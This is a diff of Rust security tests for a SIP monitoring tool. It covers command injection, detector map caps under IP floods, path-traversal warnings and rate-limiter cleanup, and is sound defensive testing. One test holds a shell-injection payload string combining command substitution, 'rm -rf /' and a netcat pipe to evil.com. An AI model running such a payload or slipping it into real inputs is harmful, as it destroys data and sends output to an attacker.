@@ -81,6 +81,98 @@ fn wait_for_file(path: &str) -> String {
     .expect("event-exec child should write the file within 10s")
 }
 
+// ── Allocation accounting (M7 cleanup) ──────────────────────────────
+
+/// A counting allocator that tracks net live heap bytes. The library sets
+/// mimalloc as the global allocator only in its binary (`main.rs`), so this
+/// integration-test crate has no allocator of its own — installing one here is
+/// free of conflicts and gives the M7 test an *exact*, quantization-free view
+/// of a map's heap growth (an RSS probe cannot: the OS resident set is skewed
+/// by allocator arenas, page purging, and capacity rounding).
+struct CountingAllocator;
+
+/// Net live bytes handed out by [`CountingAllocator`] (allocations minus frees).
+static LIVE_BYTES: std::sync::atomic::AtomicI64 = std::sync::atomic::AtomicI64::new(0);
+
+// SAFETY: every method forwards to the system allocator and only additionally
+// updates a relaxed atomic counter; the returned pointers and their validity
+// are exactly those of `std::alloc::System`.
+unsafe impl std::alloc::GlobalAlloc for CountingAllocator {
+    unsafe fn alloc(&self, layout: std::alloc::Layout) -> *mut u8 {
+        // SAFETY: `layout` is forwarded unchanged to the system allocator.
+        let ptr = unsafe { std::alloc::System.alloc(layout) };
+        if !ptr.is_null() {
+            LIVE_BYTES.fetch_add(layout.size() as i64, std::sync::atomic::Ordering::Relaxed);
+        }
+        ptr
+    }
+    unsafe fn dealloc(&self, ptr: *mut u8, layout: std::alloc::Layout) {
+        // SAFETY: `ptr`/`layout` come from a prior `alloc` and are forwarded
+        // unchanged to the system allocator that produced the pointer.
+        unsafe { std::alloc::System.dealloc(ptr, layout) };
+        LIVE_BYTES.fetch_sub(layout.size() as i64, std::sync::atomic::Ordering::Relaxed);
+    }
+    unsafe fn realloc(&self, ptr: *mut u8, layout: std::alloc::Layout, new_size: usize) -> *mut u8 {
+        // SAFETY: `ptr`/`layout`/`new_size` are forwarded unchanged to the
+        // system allocator that produced the pointer.
+        let new_ptr = unsafe { std::alloc::System.realloc(ptr, layout, new_size) };
+        if !new_ptr.is_null() {
+            LIVE_BYTES.fetch_add(
+                new_size as i64 - layout.size() as i64,
+                std::sync::atomic::Ordering::Relaxed,
+            );
+        }
+        new_ptr
+    }
+}
+
+#[global_allocator]
+static GLOBAL: CountingAllocator = CountingAllocator;
+
+/// Snapshot of net live heap bytes (see [`CountingAllocator`]).
+fn live_bytes() -> i64 {
+    LIVE_BYTES.load(std::sync::atomic::Ordering::Relaxed)
+}
+
+/// A minimal [`tracing::Subscriber`] that records each event's level and
+/// rendered message so a test can assert a specific warning fired. Only the
+/// `tracing` facade (a direct dependency) is used — the test crate has no
+/// `tracing-subscriber` dependency to install a capturing layer with.
+#[derive(Clone, Default)]
+struct WarnCapture {
+    events: std::sync::Arc<std::sync::Mutex<Vec<(tracing::Level, String)>>>,
+}
+
+impl tracing::Subscriber for WarnCapture {
+    fn enabled(&self, _md: &tracing::Metadata<'_>) -> bool {
+        true
+    }
+    fn new_span(&self, _span: &tracing::span::Attributes<'_>) -> tracing::span::Id {
+        tracing::span::Id::from_u64(1)
+    }
+    fn record(&self, _span: &tracing::span::Id, _values: &tracing::span::Record<'_>) {}
+    fn record_follows_from(&self, _span: &tracing::span::Id, _follows: &tracing::span::Id) {}
+    fn event(&self, event: &tracing::Event<'_>) {
+        struct MsgVisitor(String);
+        impl tracing::field::Visit for MsgVisitor {
+            fn record_debug(&mut self, field: &tracing::field::Field, value: &dyn std::fmt::Debug) {
+                if field.name() == "message" {
+                    use std::fmt::Write as _;
+                    let _ = write!(self.0, "{value:?}");
+                }
+            }
+        }
+        let mut visitor = MsgVisitor(String::new());
+        event.record(&mut visitor);
+        self.events
+            .lock()
+            .expect("capture mutex")
+            .push((*event.metadata().level(), visitor.0));
+    }
+    fn enter(&self, _span: &tracing::span::Id) {}
+    fn exit(&self, _span: &tracing::span::Id) {}
+}
+
 /// C1/C2: Verify that command injection via SIP Call-ID is not possible.
 /// Attacker crafts Call-ID with `$(id)` shell metacharacter -- the spawned
 /// command receives the value via env var, not interpolated into the shell
@@ -306,17 +398,36 @@ fn exec_template_no_injection_via_pipe() {
     );
 }
 
-/// C1/C2: Alert exec detail with shell metacharacters must be passed
-/// as an env var, not interpolated.
+/// C1/C2: Alert exec detail with shell metacharacters must be passed as an
+/// env var, not interpolated. We actually fire the alert with a payload full
+/// of shell metacharacters and confirm the spawned command received it as
+/// inert data: the value lands in the temp file verbatim. Had the detail been
+/// interpolated into the command string, `$(id)` / backticks / `rm -rf /`
+/// would have executed and the file contents would differ.
 #[test]
 fn alert_exec_no_injection_via_detail() {
-    let engine = AlertEngine::new(
-        vec![AlertRule::parse("test:1/1s").unwrap()],
-        Some("notify $SIPNAB_DETAIL".to_string()),
+    // The exec command echoes $SIPNAB_DETAIL (the only channel for the detail)
+    // into a temp file.
+    let tmp = tempfile::NamedTempFile::new().expect("create tempfile");
+    let tmp_path = tmp.path().to_str().unwrap().to_string();
+    let cmd = format!("printf '%s' \"$SIPNAB_DETAIL\" > {tmp_path}");
+
+    let mut engine = AlertEngine::new(vec![AlertRule::parse("test:1/1s").unwrap()], Some(cmd));
+
+    // Shell metacharacters that would execute if the detail were spliced into
+    // the command string. No CR/LF, so log-sanitization leaves it byte-exact.
+    let malicious = "$(id); rm -rf / `whoami` | nc evil.com 9";
+    let fired = engine.fire("test", localhost(), malicious);
+    assert!(
+        fired,
+        "alert should fire (fresh (src, type), not in cooldown)"
     );
-    // Verify the engine was constructed -- it will pass detail via
-    // SIPNAB_DETAIL env var, never interpolated into the command string.
-    assert!(!engine.rules().is_empty());
+
+    let contents = wait_for_file(&tmp_path);
+    assert_eq!(
+        contents, malicious,
+        "SIPNAB_DETAIL must hold the literal payload, not its shell expansion"
+    );
 }
 
 /// C1/C2: Legacy %variable placeholders are migrated to $SIPNAB_* env
@@ -463,126 +574,239 @@ fn api_ignores_x_forwarded_for_header() {
 // H4: Security Detector HashMap Caps
 // =====================================================================
 
-/// H4: Scanner detector behavioral tracking must be capped at 10,000
-/// entries to prevent memory exhaustion from diverse source IPs.
+/// The H4 entry cap shared by every security detector and the alert engine.
+const H4_CAP: u32 = 10_000;
+
+/// IP used for the "victim" whose accumulated state we track across a flood.
+/// Far above the flood's IP range (`1..=H4_CAP + 1`) so it never collides.
+fn victim_ip() -> IpAddr {
+    IpAddr::V4(Ipv4Addr::from(u32::MAX))
+}
+
+/// The H4 caps are enforced by evicting the *oldest* entry once the map is
+/// full. These tests prove that directly and deterministically, with no
+/// dependence on allocator/RSS behavior:
+///
+/// 1. a *control* confirms one-more-probe from a tracked source alerts — so
+///    the detector's accumulation is real and the negative assertion has teeth;
+/// 2. the *victim* is seeded to one probe below its alert threshold, made the
+///    oldest entry, then `H4_CAP + 1` fresh source IPs are fed — enough to fill
+///    the map and evict the oldest (the victim);
+/// 3. a final probe from the victim must NOT alert: a working cap evicted its
+///    state (fresh count), whereas a regressed cap would have retained it and
+///    the extra probe would cross the threshold and alert — failing the test.
+///
+/// H4: Scanner detector behavioral tracking must be capped to prevent memory
+/// exhaustion from diverse source IPs. Rate alert fires when probe count
+/// exceeds `BEHAVIORAL_THRESHOLD` (10) within the 5s window.
 #[test]
+#[serial_test::serial]
 fn scanner_detector_caps_behavioral_entries() {
+    let raw = build_sip(
+        "OPTIONS sip:target@example.com SIP/2.0",
+        &[
+            "From: <sip:scanner@example.com>;tag=s1",
+            "To: <sip:target@example.com>",
+            "Call-ID: cap@test",
+            "CSeq: 1 OPTIONS",
+            "Content-Length: 0",
+        ],
+        b"",
+    );
+    let base = sipnab::sip::parse_sip(
+        &raw,
+        ts(),
+        localhost(),
+        localhost(),
+        5060,
+        5060,
+        TransportProto::Udp,
+    )
+    .expect("parse");
+    let probe = |detector: &mut ScannerDetector, ip: IpAddr| {
+        let mut msg = base.clone();
+        msg.src_addr = ip;
+        detector.check(&msg)
+    };
+
+    // Control: the 11th probe from a single source alerts (10 do not).
+    let mut control = ScannerDetector::new(&[]);
+    for _ in 0..10 {
+        assert!(probe(&mut control, victim_ip()).is_none());
+    }
+    assert!(
+        probe(&mut control, victim_ip()).is_some(),
+        "control: an 11th probe must alert, else the eviction check is vacuous"
+    );
+
+    // Seed the victim to 10 probes (one below the alert threshold), oldest.
     let mut detector = ScannerDetector::new(&[]);
-
-    // Insert 10,001 unique source IPs via OPTIONS requests
-    for i in 0..10_001u32 {
-        let src = IpAddr::V4(Ipv4Addr::from(i.wrapping_add(1)));
-        let call_id = format!("cap-{i}@test");
-        let raw = build_sip(
-            "OPTIONS sip:target@example.com SIP/2.0",
-            &[
-                "From: <sip:scanner@example.com>;tag=s1",
-                "To: <sip:target@example.com>",
-                &format!("Call-ID: {call_id}"),
-                "CSeq: 1 OPTIONS",
-                "Content-Length: 0",
-            ],
-            b"",
-        );
-        let msg = sipnab::sip::parse_sip(
-            &raw,
-            ts(),
-            src,
-            localhost(),
-            5060,
-            5060,
-            TransportProto::Udp,
-        )
-        .expect("parse");
-        let _ = detector.check(&msg);
+    for _ in 0..10 {
+        assert!(probe(&mut detector, victim_ip()).is_none());
     }
-
-    // We can't directly inspect the private behavioral HashMap, but the
-    // detector should not have grown unboundedly. Verify it still functions
-    // correctly (no panic, no OOM in test).
+    // Fill the map with fresh IPs, evicting the oldest entry (the victim).
+    for ip in 1..=H4_CAP + 1 {
+        let _ = probe(&mut detector, IpAddr::V4(Ipv4Addr::from(ip)));
+    }
+    // The victim's next probe must start fresh — proof its state was evicted.
+    assert!(
+        probe(&mut detector, victim_ip()).is_none(),
+        "cap regressed: victim state survived the flood and re-alerted"
+    );
 }
 
-/// H4: Fraud detector call patterns must be capped at 10,000 entries.
+/// H4: Fraud detector call patterns must be capped. Uses the wangiri path: a
+/// 3rd short call to the same numeric prefix alerts (`WANGIRI_THRESHOLD` = 3).
 #[test]
+#[serial_test::serial]
 fn fraud_detector_caps_call_pattern_entries() {
+    let raw = build_sip(
+        "INVITE sip:5551234@example.com SIP/2.0",
+        &[
+            "From: <sip:attacker@example.com>;tag=f1",
+            "To: <sip:5551234@example.com>",
+            "Call-ID: fraud-cap@test",
+            "CSeq: 1 INVITE",
+            "Content-Length: 0",
+        ],
+        b"",
+    );
+    let base = sipnab::sip::parse_sip(
+        &raw,
+        ts(),
+        localhost(),
+        localhost(),
+        5060,
+        5060,
+        TransportProto::Udp,
+    )
+    .expect("parse");
+    // A zero-duration dialog makes every call "short" (wangiri counts these).
+    let dialog = sipnab::sip::dialog::SipDialog::new(&base).expect("dialog");
+    let probe = |detector: &mut FraudDetector, ip: IpAddr| {
+        let mut msg = base.clone();
+        msg.src_addr = ip;
+        detector.check(&msg, &dialog)
+    };
+
+    // Control: the 3rd short call to the same prefix alerts (2 do not).
+    let mut control = FraudDetector::new(None);
+    for _ in 0..2 {
+        assert!(probe(&mut control, victim_ip()).is_none());
+    }
+    assert!(
+        probe(&mut control, victim_ip()).is_some(),
+        "control: a 3rd short call must alert, else the eviction check is vacuous"
+    );
+
+    // Seed the victim to 2 short calls (one below threshold), oldest.
     let mut detector = FraudDetector::new(None);
-
-    for i in 0..10_001u32 {
-        let src = IpAddr::V4(Ipv4Addr::from(i.wrapping_add(1)));
-        let call_id = format!("fraud-cap-{i}@test");
-        let raw = build_sip(
-            "INVITE sip:bob@example.com SIP/2.0",
-            &[
-                "From: <sip:attacker@example.com>;tag=f1",
-                "To: <sip:bob@example.com>",
-                &format!("Call-ID: {call_id}"),
-                "CSeq: 1 INVITE",
-                "Content-Length: 0",
-            ],
-            b"",
-        );
-        let msg = sipnab::sip::parse_sip(
-            &raw,
-            ts(),
-            src,
-            localhost(),
-            5060,
-            5060,
-            TransportProto::Udp,
-        )
-        .expect("parse");
-        let dialog = sipnab::sip::dialog::SipDialog::new(&msg).expect("dialog");
-        let _ = detector.check(&msg, &dialog);
+    for _ in 0..2 {
+        assert!(probe(&mut detector, victim_ip()).is_none());
     }
-    // No panic or OOM -- the cap held.
+    for ip in 1..=H4_CAP + 1 {
+        let _ = probe(&mut detector, IpAddr::V4(Ipv4Addr::from(ip)));
+    }
+    assert!(
+        probe(&mut detector, victim_ip()).is_none(),
+        "cap regressed: victim call-pattern survived the flood and re-alerted"
+    );
 }
 
-/// H4: Registration flood detector source tracking must be capped at
-/// 10,000 entries.
+/// H4: Registration flood detector source tracking must be capped. Alert fires
+/// when REGISTERs exceed the threshold within the 1s window.
 #[test]
+#[serial_test::serial]
 fn reg_flood_detector_caps_source_entries() {
-    let mut detector = RegFloodDetector::new(50);
+    let raw = build_sip(
+        "REGISTER sip:registrar@example.com SIP/2.0",
+        &[
+            "From: <sip:user@example.com>;tag=r1",
+            "To: <sip:user@example.com>",
+            "Call-ID: reg-cap@test",
+            "CSeq: 1 REGISTER",
+            "Content-Length: 0",
+        ],
+        b"",
+    );
+    let base = sipnab::sip::parse_sip(
+        &raw,
+        ts(),
+        localhost(),
+        localhost(),
+        5060,
+        5060,
+        TransportProto::Udp,
+    )
+    .expect("parse");
+    let probe = |detector: &mut RegFloodDetector, ip: IpAddr| {
+        let mut msg = base.clone();
+        msg.src_addr = ip;
+        detector.check(&msg)
+    };
 
-    for i in 0..10_001u32 {
-        let src = IpAddr::V4(Ipv4Addr::from(i.wrapping_add(1)));
-        let call_id = format!("reg-cap-{i}@test");
-        let raw = build_sip(
-            "REGISTER sip:registrar@example.com SIP/2.0",
-            &[
-                "From: <sip:user@example.com>;tag=r1",
-                "To: <sip:user@example.com>",
-                &format!("Call-ID: {call_id}"),
-                "CSeq: 1 REGISTER",
-                "Content-Length: 0",
-            ],
-            b"",
-        );
-        let msg = sipnab::sip::parse_sip(
-            &raw,
-            ts(),
-            src,
-            localhost(),
-            5060,
-            5060,
-            TransportProto::Udp,
-        )
-        .expect("parse");
-        let _ = detector.check(&msg);
+    // Control: with threshold 5, the 6th REGISTER alerts (5 do not).
+    let mut control = RegFloodDetector::new(5);
+    for _ in 0..5 {
+        assert!(probe(&mut control, victim_ip()).is_none());
     }
-    // No panic or OOM -- the cap held.
+    assert!(
+        probe(&mut control, victim_ip()).is_some(),
+        "control: a 6th REGISTER must alert, else the eviction check is vacuous"
+    );
+
+    // Seed the victim to 5 REGISTERs (one below threshold), oldest.
+    let mut detector = RegFloodDetector::new(5);
+    for _ in 0..5 {
+        assert!(probe(&mut detector, victim_ip()).is_none());
+    }
+    for ip in 1..=H4_CAP + 1 {
+        let _ = probe(&mut detector, IpAddr::V4(Ipv4Addr::from(ip)));
+    }
+    assert!(
+        probe(&mut detector, victim_ip()).is_none(),
+        "cap regressed: victim source state survived the flood and re-alerted"
+    );
 }
 
-/// H4: Alert engine cooldown tracking must be capped at 10,000 entries.
+/// H4: Alert engine cooldown tracking must be capped. A fired (src, rule) pair
+/// is suppressed until its cooldown expires; a long cooldown makes "does the
+/// engine still remember this pair?" directly observable via `fire`'s return.
 #[test]
+#[serial_test::serial]
 fn alert_engine_caps_cooldown_entries() {
-    let rule = AlertRule::parse("test:1/1s:1s").expect("parse");
-    let mut engine = AlertEngine::new(vec![rule], None);
+    // Hour-long cooldown so a remembered pair stays suppressed for the whole
+    // test; the map key is (src_ip, rule).
+    let new_engine =
+        || AlertEngine::new(vec![AlertRule::parse("test:1/1s:1h").expect("parse")], None);
 
-    for i in 0..10_001u32 {
-        let src = IpAddr::V4(Ipv4Addr::from(i.wrapping_add(1)));
-        engine.fire("test", src, "cap test");
+    // Control: a repeat fire of the same pair is suppressed (cooldown works).
+    let mut control = new_engine();
+    assert!(
+        control.fire("test", victim_ip(), "d"),
+        "first fire must fire"
+    );
+    assert!(
+        !control.fire("test", victim_ip(), "d"),
+        "control: an immediate repeat must be suppressed, else the check is vacuous"
+    );
+
+    // Seed the victim's cooldown entry (oldest), then flood fresh source IPs to
+    // fill the map and evict the oldest (the victim).
+    let mut engine = new_engine();
+    assert!(
+        engine.fire("test", victim_ip(), "d"),
+        "first fire must fire"
+    );
+    for ip in 1..=H4_CAP + 1 {
+        engine.fire("test", IpAddr::V4(Ipv4Addr::from(ip)), "d");
     }
-    // No panic or OOM -- the cap held.
+    // A working cap evicted the victim, so it fires again; a regressed cap
+    // would still hold its (hour-long) cooldown and suppress it.
+    assert!(
+        engine.fire("test", victim_ip(), "d"),
+        "cap regressed: victim cooldown survived the flood and stayed suppressed"
+    );
 }
 
 // =====================================================================
@@ -1094,20 +1318,32 @@ fn constant_time_eq_different_strings_same_length() {
 // M5: Path Traversal Warning
 // =====================================================================
 
-/// M5: PcapWriter with a path containing ".." should not panic.
-/// (The writer logs a warning but still opens the file.)
+/// M5: PcapWriter with a path containing ".." must emit a traversal warning.
+/// The writer still opens the file (the user may have a legitimate reason),
+/// so the security signal is the warning — which we capture via a scoped
+/// `tracing` subscriber and assert actually fired.
 #[test]
 fn writer_warns_on_path_traversal() {
-    // We cannot easily capture log output in a test, but we verify
-    // that constructing a PcapWriter with ".." in the path does not
-    // panic. The actual file creation may fail (temp dir), which is fine.
+    let capture = WarnCapture::default();
     let path = std::path::Path::new("/tmp/../tmp/security_test_traversal.pcap");
-    let result = sipnab::capture::writer::PcapWriter::new(path, 1, None, None);
-    // It might succeed or fail (depending on permissions), but must not panic.
-    // If it succeeds, clean up.
-    if let Ok(_writer) = &result {
-        let _ = std::fs::remove_file(path);
-    }
+
+    tracing::subscriber::with_default(capture.clone(), || {
+        let result = sipnab::capture::writer::PcapWriter::new(path, 1, None, None);
+        // Construction may succeed or fail on permissions, but must not panic.
+        if let Ok(_writer) = &result {
+            let _ = std::fs::remove_file(path);
+        }
+    });
+
+    let events = capture.events.lock().expect("capture mutex");
+    let warned = events
+        .iter()
+        .any(|(level, msg)| *level == tracing::Level::WARN && msg.contains("contains '..'"));
+    assert!(
+        warned,
+        "PcapWriter::new must emit a path-traversal WARN for a '..' path; \
+         captured events: {events:?}"
+    );
 }
 
 // =====================================================================
@@ -1169,30 +1405,65 @@ fn scanner_kill_per_destination_rate_limit() {
 // M7: Rate Limiter Cleanup
 // =====================================================================
 
-/// M7: API rate limiter must clean up old entries to prevent unbounded
-/// growth from diverse source IPs.
+/// M7: API rate limiter must clean up old entries to prevent unbounded growth
+/// from diverse source IPs.
+///
+/// One batch fills the bucket map's capacity; a second, equal batch of fresh
+/// IPs follows after the first has aged past the 2s cleanup horizon. The
+/// periodic sweep (every 100th `check`) evicts the stale batch in step with the
+/// fresh inserts — and because at most 100 inserts land between sweeps, the
+/// live set never crosses its capacity tier's load-factor threshold, so the
+/// backing table is never reallocated and net heap growth is ~0. If cleanup
+/// regresses, the map doubles, the table reallocates to the next tier, and net
+/// heap jumps by tens of MiB.
+///
+/// Growth is measured exactly by the counting allocator (RSS cannot see this —
+/// arena reuse and page purging mask a doubled HashMap). `#[serial]` keeps
+/// other heavy/serial tests from perturbing the process-global counter.
 #[cfg(feature = "api")]
 #[test]
+#[serial_test::serial]
 fn api_rate_limiter_cleans_old_entries() {
     use sipnab::output::api::RateLimiter;
 
+    /// Unique IPs per batch — large enough that a doubled (uncleaned) map
+    /// crosses into the next HashMap capacity tier, a multi-MiB reallocation.
+    const BATCH: u32 = 200_000;
+    /// Permitted net heap growth for batch 2. Measured (Rust 1.97 / hashbrown):
+    /// the working path performs one tombstone-driven half-table rehash
+    /// (~6.4 MiB), a regressed cleanup a full doubling (~12.8 MiB). The budget
+    /// sits between them with headroom on both sides for concurrent-test churn.
+    const BUDGET_BYTES: i64 = 9_000_000;
+
     let mut limiter = RateLimiter::new(100);
 
-    // Fill with many unique IPs
-    for i in 0..200u32 {
-        let ip = IpAddr::V4(Ipv4Addr::from(i.wrapping_add(1)));
-        limiter.check(ip);
+    // Batch 1: allocate the bucket map's backing table for ~BATCH entries.
+    for i in 0..BATCH {
+        limiter.check(IpAddr::V4(Ipv4Addr::from(i + 1)));
     }
 
-    // The periodic cleanup (every 100th total request count) should have
-    // removed stale entries. Since all requests happen within the same
-    // second window, they may not be "old" yet, but the cleanup mechanism
-    // is present and doesn't panic or corrupt state.
-    // Verify the limiter still works correctly:
-    let test_ip = IpAddr::V4(Ipv4Addr::new(10, 10, 10, 10));
+    // Age batch 1 past the 2s cleanup horizon.
+    std::thread::sleep(std::time::Duration::from_millis(2_100));
+
+    // Batch 2: fresh IPs. Cleanup evicts stale batch 1 in step, so the table is
+    // reused rather than reallocated.
+    let before = live_bytes();
+    for i in 0..BATCH {
+        limiter.check(IpAddr::V4(Ipv4Addr::from(BATCH + i + 1)));
+    }
+    let after = live_bytes();
+
+    // Functional guarantee: still accepts a new IP after cleanup.
     assert!(
-        limiter.check(test_ip),
+        limiter.check(IpAddr::V4(Ipv4Addr::new(10, 10, 10, 10))),
         "limiter should still accept new IPs after cleanup"
+    );
+
+    let grew = after - before;
+    assert!(
+        grew < BUDGET_BYTES,
+        "rate-limiter bucket map grew {grew} bytes across a full stale-IP turnover \
+         (budget {BUDGET_BYTES}) — periodic cleanup is not evicting old entries"
     );
 }
 
@@ -1202,6 +1473,7 @@ fn api_rate_limiter_cleans_old_entries() {
 
 /// L5: --kill-response must reject code 0 (below SIP range).
 #[test]
+#[serial_test::serial]
 fn kill_response_rejects_code_zero() {
     use clap::Parser;
     let result = sipnab::cli::Cli::try_parse_from(["sipnab", "--kill-response", "0"]);
@@ -1210,6 +1482,7 @@ fn kill_response_rejects_code_zero() {
 
 /// L5: --kill-response must reject code 99 (below SIP range).
 #[test]
+#[serial_test::serial]
 fn kill_response_rejects_code_99() {
     use clap::Parser;
     let result = sipnab::cli::Cli::try_parse_from(["sipnab", "--kill-response", "99"]);
@@ -1218,6 +1491,7 @@ fn kill_response_rejects_code_99() {
 
 /// L5: --kill-response must reject code 700 (above SIP range).
 #[test]
+#[serial_test::serial]
 fn kill_response_rejects_code_700() {
     use clap::Parser;
     let result = sipnab::cli::Cli::try_parse_from(["sipnab", "--kill-response", "700"]);
@@ -1226,6 +1500,7 @@ fn kill_response_rejects_code_700() {
 
 /// L5: --kill-response must accept valid SIP response code 100.
 #[test]
+#[serial_test::serial]
 fn kill_response_accepts_code_100() {
     use clap::Parser;
     let result = sipnab::cli::Cli::try_parse_from(["sipnab", "--kill-response", "100"]);
@@ -1235,6 +1510,7 @@ fn kill_response_accepts_code_100() {
 
 /// L5: --kill-response must accept valid SIP response code 200.
 #[test]
+#[serial_test::serial]
 fn kill_response_accepts_code_200() {
     use clap::Parser;
     let result = sipnab::cli::Cli::try_parse_from(["sipnab", "--kill-response", "200"]);
@@ -1244,6 +1520,7 @@ fn kill_response_accepts_code_200() {
 
 /// L5: --kill-response must accept valid SIP response code 699.
 #[test]
+#[serial_test::serial]
 fn kill_response_accepts_code_699() {
     use clap::Parser;
     let result = sipnab::cli::Cli::try_parse_from(["sipnab", "--kill-response", "699"]);
@@ -1283,13 +1560,20 @@ fn srtp_key_material_zeroized_on_drop() {
 
 /// I5: The --api-key flag should accept values from the SIPNAB_API_KEY
 /// environment variable (configured via clap's `env` attribute).
+///
+/// This test mutates the process-global environment, which is a data race
+/// against any concurrent `getenv` (Rust 2024 makes `set_var`/`remove_var`
+/// `unsafe` for exactly this reason). `#[serial]` pins it — and every other
+/// `Cli::try_parse_from` test in this file, since clap reads this env var on
+/// every parse — into one mutually-exclusive group so no reader runs while the
+/// var is mutated.
 #[test]
+#[serial_test::serial]
 fn api_key_from_env_var() {
     use clap::Parser;
 
-    // SAFETY: This test must run in isolation (not concurrent with other
-    // tests that read SIPNAB_API_KEY). The env var is set and removed
-    // within the same scope.
+    // SAFETY: `#[serial]` guarantees no other env-reading test runs
+    // concurrently; the var is set and removed within this scope.
     unsafe {
         std::env::set_var("SIPNAB_API_KEY", "env_secret_key_42");
     }
